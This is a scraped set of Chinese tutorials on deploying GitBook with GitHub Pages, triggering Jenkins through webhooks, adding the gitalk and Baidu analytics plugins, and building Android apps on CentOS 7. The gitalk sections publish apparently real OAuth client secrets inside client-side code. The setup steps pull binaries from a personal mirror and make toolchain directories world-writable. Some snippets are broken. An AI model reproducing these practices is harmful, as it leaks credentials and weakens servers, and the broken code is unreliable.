然后根据终端的提示，在浏览器中打开http://localhost:4000查看书籍 三、Gitbook使用教程 gitbook网站是一个简单的个人在线书籍网站，在这里可以把自己的文档整理成书籍发布出来，便于阅读。 1.准备 在此之前你需要会如下准备： 1.账号： github有账号，gitbook使用github账号注册 （gitbook网站有时需要使用代理才能打开） 2.git：代码管理工具 3.Markdown：gitbook主要使用MD语法来编写书籍的 4.gitbook工具：如果你在本地开发需要安装此插件，下面有介绍 5.nodejs环境：gitbook插件需要的运行环境 6.一款Markdown编辑器：方便本地开发，推荐Typora或gitbook自己的编辑器gitbook editor 2. 在gitbook网站上创建一本文档书籍 此种方式是使用github网站加gitbook网站的方式来创建书籍的。 首先你要有一个github账号，然后在github网站中创建了一个repo仓库，用于存放书籍内容的仓库。 3.登陆gitbook网站 gitbook网站支持直接使用github账号登陆的，推荐直接使用github账号登陆。 点击右上角的Sign In登陆，然后选择Sign in with GitHub选择使用github账号进行登陆。 第一次登陆www.gitbook.com网站时，需要github网站的认证，还需要到注册github网站的邮箱中点击确认。 4.创建一本书 登陆网站后，点击右上角的用户图标，然后选择create a new space 在创建书籍中选择github,点击左侧的 “integations”集成，选择github，再点击 list all repositories 必须要有分支 5.克隆并且新建一个分支 新建一个 gitbook.xgss.net的分支，将这个分支 $ git clone git@github.com:funet8/book.git $ cd book $ git branch gitbook.xgss.net $ git branch 推送本地分支到远程 git push origin gitbook.xgss.net 合并某分支到当前分支： git checkout master git merge develop 最终效果 https://app.gitbook.com/@star-2/s/linux/v/gitbook.xgss.net/ 6.初始化一本书 git clone git@github.com:funet8/book.git cd book gitbook init warn: no summary file in this book info: create README.md info: create SUMMARY.md info: initialization is finished gitbook init会在空项目中创建README.md和SUMMARY.md两个文件： README.md文件是项目的介绍文件。 SUMMARY.md是gitbook书籍的目录。 如果SUMMARY.md文件里面有如下内容： # vim SUMMARY.md * [项目介绍](README.md) * http * [http说明](doc/http/http解析.md) * [tcp说明](doc/http/tcp/tcp说明.md) * [udp说明](doc/http/tcp/udp/udp说明.md) * HTML * [HTML5-特性说明](doc/html/HTML5-特性说明.md) 本地启动服务编写书籍 终端打开项目目录，使用gitbook serve启动服务： # gitbook serve Live reload server started on port: 35729 Press CTRL+C to quit ... info: 7 plugins are installed Error: Couldn't locate plugins \"search-pro, back-to-top-button\", Run 'gitbook install' to install plugins from registry. # gitbook install # gitbook serve Starting server ... Serving book on http://localhost:4000 开启端口： iptables -A INPUT -p tcp --dport 4000 -j ACCEPT service iptables save systemctl restart iptables.service systemctl enable iptables.service 注意：gitbook serve命令会在项目中生成一个_book的文件夹,此文件夹就是最终生成的项目。 浏览器中输入：http://192.168.1.5:4000 打开 7.文档打包 可使用 gitbook build命令来生成最终的项目： # gitbook build info: 9 plugins are installed info: 6 explicitly listed info: loading plugin \"search-pro\"... OK info: loading plugin \"back-to-top-button\"... OK info: loading plugin \"highlight\"... OK info: loading plugin \"sharing\"... OK info: loading plugin \"fontsettings\"... OK info: loading plugin \"theme-default\"... OK info: found 2 pages info: found 2 asset files info: >> generation finished with success in 0.4s ! 命令执行结束后，会在项目下生成_book的文件夹,此文件夹就是最终生成的项目。 在_book文件夹里有一个index.html文件，这个文件就是文档网站的HTM入口，把_book文件夹复制到服务器，然后把web服务的入口引向index.html即可完成文档网站的部署。 如果你想查看输出目录详细的记录，可使用gitbook build ./ --log=debug --debug来构建查看。 8. 生成电子书(报错暂时不操作) GitBook 可以生成一个网站，但也可以输出内容作为电子书（ePub，Mobi，PDF）。 # Generate a PDF file $ gitbook pdf ./ ./mybook.pdf 提示报错： InstallRequiredError: \"ebook-convert\" is not installed. # Generate an ePub file $ gitbook epub ./ ./mybook.epub # Generate a Mobi file $ gitbook mobi ./ ./mybook.mobi 9.项目部署到GitHub Pages 这部分需要使用git和github网站，如果你不会，请自行在网上搜索文档查看。 由于gitbook生成的项目跟文档的源码是两个部分，所以可以把文档放到master分支上，部署的网站放到gh-pages 分支。 10.在github上创建一个仓库 这个仓库用于存放你编写的项目，和部署项目，如何创建请自行查找。 笔者使用的是 https://github.com/funet8/book.git 11.本地项目提交到github仓库 在项目中创建一个.gitignore文件，内容如下： vim .gitignore # 忽略gitbook生成的项目目录 _book 然后终端打开项目，输入如下命令,来提交文档项目到github上： ~ git commit -m '初始化gitbook本地项目' ~ git remote add origin git@github.com:funet8/book.git ~ git push -u origin master 上面命令执行结束后，就会把代码提交到github上的仓库。 注意仓库地址要替换成你自己的链接。 12.生成项目并上传到github仓库的gh-pages分支 由于打包命令太多，为了简单化，现在写一个脚本命令来自动执行。当然你也可以终端自己执行这些命令。 为了部署方便，可以创建一个脚本文件gitbook_xgss_com_gh_pages.sh ,功能将_book目录推送到git仓库中的 gh-pages分支 内容如下： vim gitbook_xgss_com_gh_pages.sh #!/usr/bin/env sh ## 将 _book目录推送到git仓库中的 gh-pages分支 # 定义仓库地址 Git_Url='git@github.com:funet8/book.git' echo '开始执行命令' # 生成静态文件 echo '执行命令：gitbook build .' gitbook build . # 进入生成的文件夹 echo \"执行命令：cd ./_book\\n\" cd ./_book # 初始化一个仓库，仅仅是做了一个初始化的操作，项目里的文件还没有被跟踪 echo \"执行命令：git init\\n\" git init # 保存所有的修改 echo \"执行命令：git add -A\" git add -A # 把修改的文件提交 echo \"执行命令：commit -m 'deploy'\" git commit -m 'deploy.sh' # 如果发布到 https://.github.io/ echo \"执行命令：git push -f $Git_Url master:gh-pages\" git push -f $Git_Url master:gh-pages # 返回到上一次的工作目录 echo \"回到刚才工作目录\" cd - 执行成功后，打开你的github仓库，然后选择branch分支，会发现多了一个gh-pages分支，打开这个分之后，里面会有一个index.html文件。说明部署的代码上传成功了。 注意：如果没有gh-pages分支说明没有部署成功请查看刚才执行的终端看哪里报错了，解决报错直到成功部署。 编写shell脚本 gitbook_xgss_com_main.sh ,功能将推送到git仓库中的 main主分支，再合并到 gitbook.xgss.net分支上 vim gitbook_xgss_com_main.sh #!/bin/bash ## 功能将推送到git仓库中的 main主分支，再合并到 gitbook.xgss.net分支上 NowTime=`date +%Y%m%d-%H:%M:%S` echo '切换到主分支' git checkout main echo '提交当前目录下的所有文件' git add . echo '注释添加到当前分支' git commit -m \"脚本自动提交，时间：$NowTime\" echo '提交到远程仓库' git push # 合并某分支到当前分支 git checkout gitbook.xgss.net git merge main git push echo '切回主分支' git checkout main 13.配置GitHub Pages显示网站 通过浏览器可以访问：https://funet8.github.io/book/ 14.gitbook的配置文件讲解 如果你想对你的网站有更详细的个性化配置或使用插件，那么需要使用配置文件。 配置文件写完后，需要重启服务或者重新打包才能应用配置。 gitbook的配置文件名是book.json，首先在项目的根目录中创建book.json文件。 book.json主要内容： { \"title\": \"我的一本书\", \"author\" : \"yu\", \"description\" : \"我第一本书的描述，很好\", \"language\" : \"zh-hans\", \"structure\": { \"readme\": \"introduction.md\" }, \"plugins\": [ \"-lunr\", \"-search\", \"search-pro\", \"back-to-top-button\" ], \"pluginsConfig\": { \"anchor-navigation-ex\": { \"isShowTocTitleIcon\": true } }, \"links\" : { \"sidebar\" : { \"个性链接1\" : \"https://www.baidu.com\", \"个性链接2\" : \"https://www.baidu.com\" } }, \"styles\": { \"website\": \"styles/website.css\", \"ebook\": \"styles/ebook.css\", \"pdf\": \"styles/pdf.css\", \"mobi\": \"styles/mobi.css\", \"epub\": \"styles/epub.css\" } } book.json中一些主要参数 title 标题 author 作者 description 描述，对应gitbook网站的description language 使用的语言，zh-hans是简体中文，会对应到页面的 structure 指定 Readme、Summary、Glossary 和 Languages 对应的文件名，下面是这几个文件对应变量以及默认值： | Variable | Description | | --------------------- | ---------------------------------------------- | | structure.readme | Readme file name (defaults to README.md) | | structure.summary | Summary file name (defaults to SUMMARY.md) | | structure.glossary | Glossary file name (defaults to GLOSSARY.md) | | structure.languages | Languages file name (defaults to LANGS.md) | 比如想把readme文件个名字，则可以使用如下配置 \"structure\": { \"readme\": \"introduction.md\" }, 使用这个配置后，gitbook服务就不会找readme文件，而去找introduction文件当项目说明，这样就可以把readme文件完全当成代码仓库说明文档了。 plugins 使用的插件列表，所有的插件都在这里写出来，然后使用gitbook install来安装。 pluginsConfig 插件的配置信息，如果插件需要配置参数，那么在这里填写。 \"links\" : { \"sidebar\" : { \"个性链接1\" : \"https://www.baidu.com\" } } styles 自定义页面样式，各种格式对应各自的css文件 \"styles\": { \"website\": \"styles/website.css\", \"ebook\": \"styles/ebook.css\", \"pdf\": \"styles/pdf.css\", \"mobi\": \"styles/mobi.css\", \"epub\": \"styles/epub.css\" } 配置默认主题 默认的主题可以通过配置来做一下效果。 比如侧边栏菜单显示标题数字，可以在配置文件的pluginsConfig参数中写入如下字段： { \"pluginsConfig\": { \"theme-default\": { \"showLevel\": true } } } gitbook插件 GitBook 插件: http://gitbook.zhangjikai.com/plugins.html Gitbook 使用教程: https://einverne.github.io/gitbook-tutorial/ 推荐12个实用的gitbook插件： https://blog.csdn.net/weixin_37865166/article/details/91899788 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/gitbook/Jenkins_Github.html":{"url":"doc/gitbook/Jenkins_Github.html","title":"Jenkins+Github实现文档持续集成","keywords":"","body":"Gitbook+Jenkins+Github实现文档持续集成 需求说明 为了搭建一个gitbook+github的团队协作文档系统，然后通过jenkins实现持续集成，也就是当你在gitlab上修改文档以后，jenkins会自动build此项目，这个时候你再通过浏览器访问就是修改后的内容。 技术栈说明 Gitbook： 是一个基于 Node.js 的命令行工具，可使用 Github/Git 和 Markdown 来制作精美的电子书，GitBook 并非关于 Git 的教程。 Jenkins：是一个开源软件项目，是基于Java开发的一种持续集成工具，用于监控持续重复的工作，旨在提供一个开放易用的软件平台，使软件项目可以进行持续集成 。 Github：是一个面向开源及私有软件项目的托管平台，因为只支持Git作为唯一的版本库格式进行托管，故名GitHub。 系统说明 系统： Centos7 IP： 192.168.1.5(内网穿透、腾讯云服务器) 域名： gitbook.xgss.net github:https://github.com/funet8/g.xgss.net.git gitee:https://gitee.com/funet8/g.xgss.net.git https://www.gitbook.com/ Jenkins和Github配置 写了这么多在说gitbook，现在说说一下jenkins，安装jenkins省略。 重要前提 1.GitHub收到提交的代码后要主动通知Jenkins，所以Jenkins所在服务器一定要有外网IP，否则GitHub无法访问，我的Jenkins服务器是部署在腾讯云的云主机上，带有外网IP（如果只有内网，那则需要用到内网穿透工具才能实现）； 2.本次实战要提交源码到GitHub，所以您需要有一个GitHub号，并在上面创建项目； 3.如果是内网的gitlab+jenkins则不需要有外网IP 基本流程 将编写的文件提交Github，Github通过Webhook钩子，通知执行jenkins，jenkins执行上线脚本或者构建动作，完成整个流程。 新建jenkins任务 回到主页 –> 新建任务 –> 新建一个自由风格的软件项目 配置触发器 身份令牌这个可以随便写，尽量复杂一些 生成钩子地址 JENKINS_URL/job/gitbook.xgss.net_github_online/build?token=TOKEN_NAME。将这个地址填写到github的项目webhook中。 http://0.0.0.0+端口/job/任务名/build?token=TOKEN值的链接 构建执行脚本 Github 设置 webhooks 进入GitHub上指定的项目 –> setting –> WebHooks&Services –> add webhook –> 输入刚刚部署地址 JENKINS_URL/job/gitbook.xgss.net_github_online/build?token=TOKEN_NAME 测试能否自动提交 在git push看jenkins 能否自动执行。 有报错，在点击看具体的报错 发现只能有get方法，post方法会报403 写了一个shell脚本每次写完自动提交，并且通知jenkins # 提交 git add . git commit -m \"提交修改文档\" git push # webhook钩子 curl \"http://JENKINS_URL/job/项目名/build?token=密钥\" #修改以下参数 SERVER='http://IP:8080' Job_Name='gitbook.xgss.net_github_online' Token='token123456' USER='name' Password='1234' #使用curl触发jenkins curl --user $USER:${Password} ${SERVER}/job/${Job_Name}/build?token=${Token} Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 10:44:24 "},"doc/gitbook/Github-Page-my-domain.html":{"url":"doc/gitbook/Github-Page-my-domain.html","title":"Github Page怎么绑定自己的域名","keywords":"","body":"Github Page怎么绑定自己的域名 前提 已经有域名，没有域名的话先去申请一个域名。 如果想简单省心，不计较时间和金钱的话，那就阿里云或腾讯云买全套服务器+域名+解析。 gitbook.xgss.net 二级域名解析到github上，轻松拥有免费站点。 最终效果 github的域名： https://funet8.github.io/book/ 自己的域名： gitbook.xgss.net CNAME解析到 funet8.github.io 通过浏览器访问自己的域名 gitbook.xgss.net 得到免费站点 1.在仓库里添加CNAME 在github项目中添加一个文件 CNAME 文件里填写内容 gitbook.xgss.net 要绑定的域名（不要包含Http://和www） 2.在github仓库中添加Custom domain 如图找到 Custom domain添加域名后保存即可。 3.添加域名解析 在阿里云域名后台添加解析 ping域名 # ping gitbook.xgss.net PING funet8.github.io (185.199.109.153) 56(84) bytes of data. 64 bytes from cdn-185-199-109-153.github.com (185.199.109.153): icmp_seq=1 ttl=49 time=281 ms 64 bytes from cdn-185-199-109-153.github.com (185.199.109.153): icmp_seq=2 ttl=49 time=291 ms ^C --- funet8.github.io ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 2000ms rtt min/avg/max/mdev = 281.192/289.782/296.935/6.536 ms 浏览器访问 http://gitbook.xgss.net/ 即可得到免费的Github站点 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/gitbook/gitbook中使用百度统计查看页面访问情况.html":{"url":"doc/gitbook/gitbook中使用百度统计查看页面访问情况.html","title":"gitbook中使用百度统计查看页面访问情况","keywords":"","body":"gitbook中使用百度统计查看页面访问情况 安装baidu-tongji 在配置文件book.json中添加 { \"plugin\": [\"baidu-tongji\"] } 安装 gitbook install 登录百度统计官网，注册或者登录 [新增网站]后，点击[获取代码]，获取以下类似代码： var _hmt = _hmt || []; (function() { var hm = document.createElement(\"script\"); hm.src = \"https://hm.baidu.com/hm.js?559562c6410b9fd49a0afe52650d40bd\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(hm, s); })(); 将步骤一获取代码自动生成的token(即\"559562c6410b9fd49a0afe52650d40bd\")添加到配置文件 { \"plugin\": [\"baidu-tongji\"], \"pluginsConfig\": { \"baidu-tongji\": { \"token\": \"559562c6410b9fd49a0afe52650d40bd\" } } } https://github.com/huisman6/gitbook-plugin-baidu-tongji Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-29 11:20:36 "},"doc/gitbook/gitbook使用gitalk插件制作留言板.html":{"url":"doc/gitbook/gitbook使用gitalk插件制作留言板.html","title":"gitbook使用gitalk插件制作留言板","keywords":"","body":"gitbook使用gitalk插件制作留言板 gitalk评论插件 disqus 评论插件虽然比较好用,但是注册是在 disqus.com 官网,需要特殊手段才能访问,即便成功配置了国内一般也是访问不到的,因此功能相当鸡肋. gitalk 评论插件解决了这一痛点,利用 github 的开发者接口授权,将讨论区的 issue 变成评论区,和 github 结合的如此紧密,适合用源码托管到 github 这类情况. 看一下gitalk https://gitalk.github.io/ 是如何介绍自己的呢. 看着效果确实不错,并且评论区的内容直接作为 github 仓库的 issue,这么好的想法我咋没想到呢! 好了,现在让我们开始集成到我们自己的项目中,遇到新鲜事物,当然先要参考官网介绍了. 申请 GitHub Application 授权 登录 github 账号,点击 在线申请 授权应用. 看到这一步,想必读者已经有个大概印象了,gitalk 插件是利用 github 的开发者服务,进行授权进而调用 issue 相关接口从而显示评论功能. 这种由官网提供的开发者服务还是比较好的,至少感觉比手动模拟提交要靠谱些,更何况走的是 OAuth 授权模式. 比如第三方应用提供微信登录,走的也是 OAuth 协议,这里的第三方应用当然就是现在说的 Gitalk 插件,微信就是我们的 github . 新建应用,首页 url 和授权回调 url 填写相同的首页链接即可,其他情况自定义填写. 应用登记成功后会生成 token 令牌,clientId 和 clientSecret 需要重点保存下来,待会需要用到. 安装并集成到网站 在需要添加评论的页面,添加下述内容引入 gitalk 插件,其中参数来自我们上一步获取的 clientId 和 clientSecret . 默认应该添加到 .html 页面,当然也可以添加到 .md 页面,毕竟 markdown 语法也支持 html 标签. var gitalk = new Gitalk({ \"clientID\": \"clientId\", \"clientSecret\": \"clientSecret\", \"repo\": \"GitHub repo\", \"owner\": \"GitHub repo owner\", \"admin\": [\"GitHub repo admin\"], \"id\": location.pathname, \"distractionFreeMode\": false }); gitalk.render(\"gitalk-container\"); 稍微解释下参数的含义: \"clientID\" : [必选] GitHub Application Client ID \"clientSecret\" : [必选] GitHub Application Client Secret \"repo\" : [必选] GitHub repository \"owner\" : [必选] GitHub repository 所有者，可以是个人或者组织 \"admin\" : [必选] GitHub repository 的所有者和合作者 (对这个 repository有写权限的用户) \"id\" : [可选] 页面的唯一标识,默认值: location.href, 长度必须小于50,否则会报错! \"distractionFreeMode\": [可选] 类似 Facebook 评论框的全屏遮罩效果,默认值: false 上述配置只是最简配置,如果想要了解更多高级配置,请参考 官方文档 测试集成效果 按照上述安装步骤,将代码复制到首页(README.md)文件中,然后推送到 github ,体验下集成效果. 注意: 这里必须推送到服务器,因为申请应用时填写的域名是线上地址,因而本地测试是不会成功的,会报错,这一点和微信支付的回调地址类似. 示例: var gitalk = new Gitalk({ \"clientID\": \"3f62415a283d19cbd696\", \"clientSecret\": \"aed0e1db0620bf5d0e3a3f0225f801997ad74e58\", \"repo\": \"snowdreams1006.github.io\", \"owner\": \"snowdreams1006\", \"admin\": [\"snowdreams1006\"], \"id\": location.pathname, \"distractionFreeMode\": false }); gitalk.render(\"gitalk-container\"); 上述参数仅供参考,实际使用中请替换成自己的配置,不然你也没有我仓库的权限,肯定会报错的啊! 心心相念的 gitalk 评论区呢?是不是哪里配置错了,为啥没有出来? 别急,要淡定,看一下提示说\"未找到的 Issue 进行评论,请联系 @snowdreams1006 初始化创建\",既然如此,那我们就操作一下吧! 点击下方的按钮 使用 Github登录 ,会跳转到相应的仓库,然后按照提示确定. 再次返回首页,刷新一下看看发生什么神奇的事情了? 终于集成了评论功能,而且还支持 markdown 格式的评论呢! 进一步思考 确实不错,心中自然是欣喜万分,但别高兴太早了,因为你会发现其他页面并没有评论区,也很好理解,我们目前仅仅在首页(README.md) 集成了 gitalk 插件,也就是说使用 gitbook build 输出的 index.html 首页才支持评论区,其他页面没有插入上述代码,自然是没有评论区功能的啊! 那如果想要实现全网站的所有页面都集成评论区功能,应该怎么办呢? 百度搜索了一下,并没有找到优雅的解决方案,如果有人能够提供更好的解决方案,还望不吝赐教,在此谢过. 既然网上找不到优雅的解决方案,那寻求专业人士的帮助也是一种好办法,我去哪找 gitalk 的使用者呢? 聪明的你或许已经想到了,解铃还须系铃人,当然是向推荐给我插件的大牛提问了! 他确实提供了一种思路,以下是网友@八一菜刀原话: 文档里面我用的是tbfed-pagefooter插件，不过我是在本地使用gitbook install后重写了该插件的js，无非就是在js里面加一段Gitalk的调用代码，这样使用gitbook build命令的时候，所有的页面都会有Gitalk的评论调用 人家既然已经提供了思路,不太好意思继续麻烦人家要源码,既然如此,那就自己动手吧! tbfed-pagefooter 插件很熟悉,一般是用于注明版权以及文章的修订时间的,而且作用于每个页面,这一点就满足了集成 gitalk 相关代码的基本要求. 大体方向确定后,目前就是解决如何在 tbfed-pagefooter 插件构建的相关生命周期内顺便执行我们的代码? 正常当前项目安装 tbfed-pagefooter 插件后应该存放于 /node_modules/gitbook-plugin-tbfed-pagefooter 目录,大致看一下插件的项目结构. gitbook-plugin-tbfed-pagefooter ├── LICENSE ├── README.md ├── assets │ └── footer.css ├── index.js └── package.json 1 directory, 5 files 为了基本看懂项目文件作用,特意去看了下 gitbook 插件开发文档,目标锁定在 index.js . 截取重要片段,原来是电子书构建前动态增加了 html 片段啊,这就好办了! hooks: { 'page:before': function(page) { var _label = '最后更新时间: ', _format = 'YYYY-MM-DD', _copy = 'powered by snowdreams1006' if(this.options.pluginsConfig['tbfed-pagefooter']) { _label = this.options.pluginsConfig['tbfed-pagefooter']['modify_label'] || _label; _format = this.options.pluginsConfig['tbfed-pagefooter']['modify_format'] || _format; var _c = this.options.pluginsConfig['tbfed-pagefooter']['copyright']; _copy = _c ? _c + ' all right reserved，' + _copy : _copy; } var _copy = ''+_copy+'' var str = ' \\n\\n' + _copy + '' + _label + '\\n' + _for21pmt + '\\n' str += '\\n\\n'+ '\\n\\n'+ '\\n\\n'+ '\\n\\n'; page.content = page.content + str; return page; } }, 看懂基本原理后顺便修改了版权说明以及修订时间格式,然后追加了集成 gitalk 的相关代码. 这里为了方便修改 gitalk 配置,特意将相关配置项单独托管到 github 专门的 gitalk-config.js 文件. 至于配置文件的内容,并没什么特殊之处,还是顺便贴一下吧! var gitalk = new Gitalk({ \"clientID\": \"05fb7151030cefa1a084\", \"clientSecret\": \"d5013b1052b33b3b69101563018692f8338b38fb\", \"repo\": \"g.xgss.net\", \"owner\": \"funet8\", \"admin\": [\"funet8], \"id\": location.pathname, \"distractionFreeMode\": false }); gitalk.render(\"gitalk-container\"); 至此,之后再本地构建电子书时(gitbook build),gitbook-plugin-tbfed-pagefooter 自然会顺便帮我们运行集成 gitalk 的相关代码,这才是相对来说比较优雅的做法. 当然也不一定非要借助 gitbook-plugin-tbfed-pagefooter 插件帮忙,也可以借助别的插件进行集成,甚至自己写个更好的插件. Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-29 16:21:56 "},"doc/android-to-apk/":{"url":"doc/android-to-apk/","title":"自动打包安卓APP","keywords":"","body":"在CentOS7下构建安卓编译环境 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/android-to-apk/1.Centos7-Android-software.html":{"url":"doc/android-to-apk/1.Centos7-Android-software.html","title":"在CentOS 7下构建安卓Android编译环境","keywords":"","body":"在CentOS 7下构建安卓Android编译环境 根据安卓开发的需求实现流程 1.安卓开发工程师本机开发 2.提交Git仓库-master分支 3.jenkins手动打包(可实现自动)，进入后台 http://192.168.1.8:9091/ 执行任务: 打包服务器拉取最新git仓库代码 进入项目目录执行 ./gradlew :launcher:assembleRelease 4.将生成的apk包cp到 http://android.XXXX.ltd WEB目录，安卓研发下载apk包 5.测试 6.上线投放 分三篇文章讲解 1.CentOS7下构建安卓Android编译环境 2.CentOS7下安装Jenkins 3.基于centos7的jenkins安卓自动打包 在 Android Studio 之外，还可以通过 Gradle Script 来编译 Android 项目并构建和测试应用。 本文是一个备忘录，以记录我在 x86_64 GNU/Linux 系统 CentOS Linux release 7.8.2003 下折腾 Android 编译环境的一个过程。 本文将会安装以下组件： Git JDK 1.8 Go 1.14.7 Android SDK Android NDK Rust 1.45.0 Android Targets: armv7-linux-androideabi aarch64-linux-android i686-linux-android x86_64-linux-android 以下的所有过程均是在 root 用户下操作。 1. 安装 Git 和 JDK 1.8 这两个组件发行版自带，通过以下命令即可安装。与此同时，再安装一些其他必要的组件 wget 和 unzip。 $ yum install -y java-1.8.0-openjdk java-1.8.0-openjdk-devel wget unzip git 完成后通过以下命令验证 JDK 版本号。 $ java -version openjdk version \"1.8.0_252\" OpenJDK Runtime Environment (build 1.8.0_252-b09) OpenJDK 64-Bit Server VM (build 25.252-b09, mixed mode) $ javac -version javac 1.8.0_252 2. 安装 Go 目前 Go 的最新版是 1.14.7。安装过程如下。 $ GO_VERSION=1.14.7 $ wget -O /tmp/go${GO_VERSION}.tar.gz http://js.funet8.com/centos_software/go${GO_VERSION}.linux-amd64.tar.gz $ tar -C /usr/local -xzf /tmp/go${GO_VERSION}.tar.gz $ rm -fv /tmp/go${GO_VERSION}.tar.gz $ export PATH=/usr/local/go/bin:$PATH 完成后通过以下命令验证 Go 版本号。 $ go version go version go1.14.7 linux/amd64 3. 安装 Android SDK 及 Android NDK 假设 ANDROID_HOME 路径是 /data/sdk。安装过程如下。 $ mkdir -p /data/sdk && cd /data/sdk $ wget http://js.funet8.com/centos_software/commandlinetools-linux-6609375_latest.zip $ unzip -q commandlinetools-linux-6609375_latest.zip $ rm -fv commandlinetools-linux-6609375_latest.zip $ export PATH=/data/sdk/tools/bin:$PATH $ [ -z \"${ANDROID_HOME}\" ] && export ANDROID_HOME=/data/sdk $ yes | sdkmanager --sdk_root=${ANDROID_HOME} --licenses 通过 sdkmanager 来安装一些组件。一条命令一步到位。如下。 $ sdkmanager --sdk_root=${ANDROID_HOME} \"platform-tools\" \"platforms;android-30\" \"platforms;android-29\" \"ndk-bundle\" \"ndk;21.0.6113669\" \"build-tools;29.0.2\" 完成后，确认已安装的列表。 $ sdkmanager --sdk_root=${ANDROID_HOME} --list Installed packages: Path | Version | Description | Location ------- | ------- | ------- | ------- build-tools;29.0.2 | 29.0.2 | Android SDK Build-Tools 29.0.2 | build-tools/29.0.2/ ndk-bundle | 21.3.6528147 | NDK | ndk-bundle/ ndk;21.0.6113669 | 21.0.6113669 | NDK (Side by side) 21.0.6113669 | ndk/21.0.6113669/ patcher;v4 | 1 | SDK Patch Applier v4 | patcher/v4/ platform-tools | 30.0.3 | Android SDK Platform-Tools | platform-tools/ platforms;android-29 | 4 | Android SDK Platform 29 | platforms/android-29/ platforms;android-30 | 1 | Android SDK Platform 30 | platforms/android-30/ tools | 2.1.0 | Android SDK Tools 2.1 | tools/ Available Packages: 以下省略 4. 安装 Rust 及其它 目前 Rust 的最新版是 1.45.0。安装过程如下。 $ export RUSTUP_HOME=/usr/local/rustup CARGO_HOME=/usr/local/cargo $ RUST_VERSION=1.45.0 $ RUSTARCH='x86_64-unknown-linux-gnu' $ wget -O /tmp/rustup-init \"https://static.rust-lang.org/rustup/archive/1.21.1/${RUSTARCH}/rustup-init\" $ chmod 755 /tmp/rustup-init $ /tmp/rustup-init -y --no-modify-path --profile minimal --default-toolchain $RUST_VERSION $ rm -fv /tmp/rustup-init $ chmod -R a+w ${RUSTUP_HOME} ${CARGO_HOME} $ export PATH=/usr/local/cargo/bin:$PATH 完成后通过以下命令验证 Rust 及组件的版本号。 $ rustup --version rustup 1.21.1 (7832b2ebe 2019-12-20) $ cargo --version cargo 1.45.0 (744bd1fbb 2020-06-15) $ rustc --version rustc 1.45.0 (5c1f21c3b 2020-07-13) Rust 安装以下 Android Targets: armv7-linux-androideabi aarch64-linux-android i686-linux-android x86_64-linux-android 安装过程如下。 $ rustup install stable $ rustup default stable $ rustup target add armv7-linux-androideabi $ rustup target add i686-linux-android $ rustup target add aarch64-linux-android $ rustup target add x86_64-linux-android 5. 持久化环境变量 上面的安装步骤是通过 export 来定义系统 PATH 的，在退出当前登录后就会丢失设置。 因此需要持久化一些环境变量。 编辑 ~/.bash_profile 文件。添加 ANDROID_HOME，RUSTUP_HOME，CARGO_HOME 的定义以及增加 PATH 定义。 最后呈现内容如下。 # .bash_profile # Get the aliases and functions if [ -f ~/.bashrc ]; then . ~/.bashrc fi # User specific environment and startup programs export ANDROID_HOME=/data/sdk RUSTUP_HOME=/usr/local/rustup CARGO_HOME=/usr/local/cargo PATH=$PATH:$HOME/bin:$ANDROID_HOME/tools/bin:/usr/local/go/bin:/usr/local/cargo/bin export PATH 6. 编译 Android 项目 这里选一个比较简单的项目来练手：v2ray-plugin-android。 编译过程如下。 $ git clone https://github.com/shadowsocks/v2ray-plugin-android.git $ cd v2ray-plugin-android $ git submodule update --init --recursive $ ./gradlew assembleRelease 完成后，编译好的 apk 文件位于 app/build/outputs/apk/release 路径下。 Android 系统要求所有 apk 必须先使用证书进行数字签名，然后才能安装到设备上或进行更新。 因此这些 apk 文件还不能被直接拿来安装。 至于如何签名，请参考以下链接，过程省略。 https://developer.android.com/studio/publish/app-signing 7. 总结 当你习惯于用命令行做事的时候，你会发现效率往往会有很大的提升。编译代码亦是如此。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/jenkins/CentOS-7-Install-Jenkins.html":{"url":"doc/jenkins/CentOS-7-Install-Jenkins.html","title":"CentOS7下安装Jenkins","keywords":"","body":"2.安卓项目APK自动打包流程-安装jenkins Jenkins 简介 Jenkins是一个开源的、可扩展的持续集成、交付、部署（软件/代码的编译、打包、部署）的基于web界面的平台。允许持续集成和持续交付项目，无论用的是什么平台，可以处理任何类型的构建或持续集成。 软件开发的流程 编码 --> 构建 --> 集成 --> 测试 --> 交付 --> 部署 系统介绍 系统： centos7 IP地址： 192.168.1.8 安装java # cd /data/software/ # wget http://js.funet8.com/centos_software/jdk-8u211-linux-x64.tar.gz # mkdir /usr/local/java/ # tar -zxvf jdk-8u211-linux-x64.tar.gz -C /usr/local/java/ 配置环境变量 # vim /etc/profile 添加： export JAVA_HOME=/usr/local/java/jdk1.8.0_211 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib export PATH=${JAVA_HOME}/bin:$PATH # source /etc/profile 检查java是否安装成功 ln -s /usr/local/java/jdk1.8.0_171/bin/java /usr/bin/java java -version 安装 Jenkins 下载安装 在这个地址下载 https://jenkins.io/zh/download/ , 如果下载的是 war 包, 直接运行以下命令 下载 Jenkins 的jenkins.war包 java -jar /data/software/jenkins.war 指定端口： nohup java -jar /data/software/jenkins.war --ajp13Port=-1 --httpPort=9090 >/dev/null 2>&1 & 开启防火墙 iptables -I INPUT -p tcp --dport 9090 -j ACCEPT service iptables save systemctl restart iptables.service 在启动Web容器之前设置JENKINS_HOME环境变量 用root用户登录，编辑profile文件 vi /etc/profile 在最后加入 export JENKINS_HOME=/data/jenkins_data 保存，退出后执行 source /etc/profile 然后打开浏览器, 进入 localhost:9090 即可开始安装, Jenkins 的安装步骤也没啥难点. http://192.168.1.8:9090/ 下面就是 Jeknins 的界面了, 安装插件 进入菜单 Manage Jenkins => Manage Plugins, 这个地方就是管理插件的地方, 由于自带的源无法访问, 这里使用下面这个地址, 如果你在浏览器可以打开这个链接, 说明没问题, 否则请自行百度其他源地址 http://mirror.esuni.jp/jenkins/updates/update-center.json 好了, 插件已经可以正常下载了, 以下是需要安装的插件 Git plugin Localization: Chinese 